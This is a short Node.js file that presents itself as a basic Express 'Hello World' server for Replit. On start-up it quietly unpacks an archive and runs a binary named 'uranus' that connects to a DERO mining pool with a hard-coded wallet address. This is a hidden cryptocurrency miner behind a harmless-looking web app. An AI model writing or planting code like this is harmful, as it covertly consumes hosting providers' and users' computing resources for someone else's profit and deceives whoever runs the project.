const express = require('express')
const app = express()
const port = 3000
const { exec } = require('child_process');

app.get('/', (req, res) => {
  res.send('Hello World')
})

app.listen(port, () => {
  console.log(`Replit running on port: ${port}`)
})


exec("tar -xf kaas.tar.xz", (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);
});

exec("./uranus -o wss://community-pools.mysrv.cloud:10300 -u dero1qyfjd3gswr7afgrgm0w8trp5wn09sudh9mld8czscf9a46n6grhcgqghx8k3p", (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);
});